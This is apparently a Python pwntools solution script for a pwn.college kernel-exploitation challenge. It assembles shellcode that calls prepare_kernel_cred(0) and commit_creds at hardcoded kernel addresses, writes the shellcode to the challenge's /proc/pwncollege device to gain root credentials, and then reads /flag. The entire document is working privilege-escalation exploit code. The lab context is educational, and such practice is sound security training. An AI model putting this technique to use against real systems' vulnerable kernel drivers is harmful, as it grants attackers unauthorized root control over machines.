#!/bin/python

import os 
import sys
import fcntl
from pwn import * 

context.arch = 'amd64'

PREP_CRED_ADDR   = 0xffffffff81089660
COMMIT_CRED_ADDR = 0xffffffff81089310

shellcode = f'''
    xor rdi, rdi
    mov rax, {PREP_CRED_ADDR} 
    call rax

    mov rdi, rax
    mov rax, {COMMIT_CRED_ADDR}
    call rax
    ret
'''
sc_asm = asm(shellcode)

with open("/proc/pwncollege", 'wb') as f:
    f.write(sc_asm)

try:
    with open("/flag", 'r') as flag:
        print(flag.read())
except Exception as ex:
    print("Exception:: " + str(ex))

